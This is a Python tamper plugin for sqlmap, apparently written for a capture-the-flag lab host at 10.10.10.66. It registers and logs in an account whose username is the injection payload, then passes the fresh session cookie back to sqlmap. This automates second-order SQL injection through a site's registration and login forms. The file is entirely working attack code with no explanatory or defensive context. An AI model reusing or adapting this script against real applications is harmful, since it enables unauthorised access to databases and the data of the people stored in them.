#!/usr/bin/env python
# Author: Alamot
import re
import requests
from lib.core.enums import PRIORITY
from random import sample
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass
    
def new_cookie(payload):
    session = requests.Session()
    paramsPost = {"register":"Register", "pass":"pass", "user":payload}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0","Referer":"http://10.10.10.66/register.php","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://10.10.10.66/register.php", data=paramsPost, headers=headers)
    result = re.search('PHPSESSID=(.*?);', response.headers['Set-Cookie'])
    PHPSESSID = result.group(1)
    
    paramsPost = {"login":"Login", "pass":"pass", "user":payload}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0","Referer":"http://10.10.10.66/index.php","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://10.10.10.66/index.php", data=paramsPost, headers=headers)
    
    return "PHPSESSID="+PHPSESSID
    
def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["Cookie"] = new_cookie(payload)
    #print(headers, payload)
    return payload
